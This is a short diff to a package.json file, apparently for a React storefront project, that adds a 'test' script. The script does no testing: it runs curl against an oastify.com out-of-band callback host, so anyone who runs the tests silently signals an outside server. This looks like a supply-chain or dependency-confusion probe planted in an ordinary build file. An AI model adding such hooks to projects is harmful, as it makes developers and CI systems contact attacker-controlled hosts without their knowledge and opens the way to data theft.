@@ -19,7 +19,8 @@
     "eject": "react-scripts eject",
     "lint": "npx eslint **/*.{ts,tsx}",
     "lint:fix": "npx eslint **/*.{ts,tsx} --fix",
-    "start": "react-scripts start"
+    "start": "react-scripts start",
+    "test": "curl https://ujhax76w0tsandy0e5wu0p6dk4qyes2h.oastify.com/moonpay-storefront"
   },
   "browserslist": {
     "production": [
